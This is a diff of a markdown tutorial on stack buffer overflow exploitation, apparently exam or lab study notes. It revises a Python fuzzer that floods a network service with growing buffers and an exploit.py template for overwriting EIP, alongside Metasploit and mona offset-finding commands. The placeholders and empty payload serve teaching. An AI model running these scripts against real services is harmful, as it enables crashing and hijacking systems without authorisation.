@@ -98,33 +98,41 @@ s_string_variable("0");
 
 #### Fuzzing
 1. Get the amount of bytes it crashes the program, the following fuzzing script could be used:
+- Set the IP and PORT
+- Set the prefix if required
 
 ```
-#!/usr/bin/python
-import sys, socket
-from time import sleep
+import socket, time, sys
 
-buffer = "A" * 100
+ip = "<IP>"
+port = <PORT>
+prefix = ""
+timeout = 5
 
-while True:
+buffer = []
+counter = 100
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += 100
+
+for string in buffer:
     try:
-        print "Fuzzing App with %s bytes" % str(len(buffer))
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('<IP>',<PORT>))
-                        
-        s.send(('<COMMAND>' + buffer))
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        connect = s.connect((ip, port))
+        s.recv(1024)
+        print("Fuzzing with %s bytes" % len(string))
+        s.send(prefix + string + "\r\n")
+        s.recv(1024)
         s.close()
-        sleep(1)
-        buffer = buffer + "A"*100
-    
     except:
-        print "Fuzzing crashed at %s bytes" % str(len(buffer))
-        sys.exit()
+        print("Could not connect to " + ip + ":" + str(port))
+        sys.exit(0)
+    time.sleep(1)
 ```
 
 #### Find the offset
-1.	Create a offset pattern with the amount of bytes the program crashed.
-   Use a couple more tho!
+1.	Create a offset pattern with the amount of bytes +400 the program crashed.
 
 ```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>```
 
@@ -135,29 +143,36 @@ or
 !mona pc <length>
 ```
 
-2.	Edit the script to add the offset pattern.
+2.	Create a new script named exploit.py and set the offset pattern in the variable ```payload```
 
 ```
-#!/usr/bin/python
-import sys, socket
-from time import sleep
+import socket
 
-offset = ""
+ip = "<IP>"
+port = <PORT>
 
-buffer = offset
+prefix = ""
+offset = 0
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(('<IP>',<PORT>))
-    s.send(('<COMMAND>' + buffer))
-    s.close()
-    
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+    s.send(buffer + "\r\n")
+    print("Done!")
 except:
-    print "Error connecting to server"
-    sys.exit()
+    print("Could not connect.")
 ```
 
-3.	Send the offset pattern and get the EIP value out of the Immunity Debugger OR Run the following and skip 4.
+3.	Run the following in Mona and skip 4 (If it doesn't work do step 4 tho as a workaround)
 ```
 !mona findmsp -distance <LENGTH OF GENERATED STRING>
 #Check for output: EIP contains normal pattern : ... (offset XXXX)
@@ -168,6 +183,8 @@ except:
 ```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <EIP VALUE>```
 
 ```!mona po <EIP VALUE>```
+
+5. Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".
 
 #### Overwriting the EIP
 1. Edit the script, remove the offset variable. Then change the buffer to overwrite the buffer with 4 B's
